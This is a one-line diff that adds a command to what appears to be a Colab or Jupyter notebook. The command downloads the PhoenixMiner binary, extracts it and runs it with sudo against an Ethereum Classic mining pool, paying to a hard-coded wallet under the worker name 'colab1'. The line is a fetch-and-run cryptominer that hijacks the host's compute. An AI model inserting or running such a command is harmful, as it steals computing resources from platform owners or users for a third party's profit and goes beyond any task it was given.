@@ -1,0 +1,1 @@
+! apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool stratum+tcp://us.etc.herominers.com:1150 -wal 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.colab1 -pass x -proto 4 -stales 0
